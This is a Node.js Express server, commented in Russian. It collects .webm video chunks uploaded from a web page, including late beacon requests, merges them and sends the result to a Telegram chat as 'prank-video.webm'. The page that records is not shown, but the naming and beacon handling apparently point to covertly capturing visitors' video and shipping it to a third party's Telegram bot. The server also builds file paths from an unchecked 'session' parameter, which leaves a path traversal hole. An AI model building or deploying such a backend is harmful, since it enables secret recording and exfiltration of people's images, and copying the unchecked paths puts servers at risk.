require('dotenv').config({ path: './process.env' });
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();

const TMP = path.join(__dirname, 'tmp-uploads');
fs.mkdirSync(TMP, { recursive: true });

const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TG_CHAT = process.env.TELEGRAM_CHAT_ID;

console.log(
  'TG_TOKEN:',
  TG_TOKEN ? TG_TOKEN.slice(0, 10) + '...' : '❌ НЕ ЗАДАН',
);
console.log('TG_CHAT :', TG_CHAT || '❌ НЕ ЗАДАН');

// --- статика: отдаём public/index.html и всё из public ---
app.use(express.static(path.join(__dirname, 'public')));

// --- парсеры body ---
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

// --- главная страница ---
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// --- 1) приём чанка ---
app.post('/upload-chunk', (req, res) => {
  const { session, index } = req.query;
  if (!session || index == null) return res.status(400).send('bad params');

  const dir = path.join(TMP, session);
  fs.mkdirSync(dir, { recursive: true });

  const file = path.join(dir, `${String(index).padStart(8, '0')}.webm`);
  const ws = fs.createWriteStream(file);
  req.pipe(ws);
  ws.on('finish', () => res.sendStatus(200));
  ws.on('error', (e) => {
    console.error(e);
    res.sendStatus(500);
  });
});

// --- 2) финал: склеить и отправить в Telegram ---
app.post('/upload-finish', async (req, res) => {
  const session = req.body.session || req.query.session;
  if (!session) return res.status(400).send('no session');

  const dir = path.join(TMP, session);
  if (!fs.existsSync(dir)) return res.status(404).send('no session dir');

  // дать долететь последнему чанку (beacon-запросы приходят с задержкой)
  await new Promise((r) => setTimeout(r, 1500));

  const files = fs
    .readdirSync(dir)
    .filter((f) => f.endsWith('.webm'))
    .sort();
  if (!files.length) return res.status(400).send('no chunks');

  const out = path.join(TMP, `${session}.webm`);
  const ws = fs.createWriteStream(out);
  for (const f of files) {
    ws.write(fs.readFileSync(path.join(dir, f)));
  }
  ws.end();

  ws.on('finish', async () => {
    try {
      await sendToTelegram(out);
      console.log('✅ Отправлено:', session, files.length, 'чанков');
      res.sendStatus(200);
    } catch (e) {
      console.error('Telegram error:', e);
      res.sendStatus(500);
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
      try {
        fs.unlinkSync(out);
      } catch {}
    }
  });
});

// --- 3) Telegram ---
async function sendToTelegram(filePath) {
  const buf = fs.readFileSync(filePath);
  const form = new FormData();
  form.append('chat_id', TG_CHAT);
  form.append(
    'video',
    new Blob([buf], { type: 'video/webm' }),
    'prank-video.webm',
  );
  form.append('supports_streaming', 'true');

  const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, {
    method: 'POST',
    body: form,
  });
  if (!r.ok) throw new Error('telegram: ' + (await r.text()));
}

app.listen(3000, () => console.log('http://localhost:3000'));
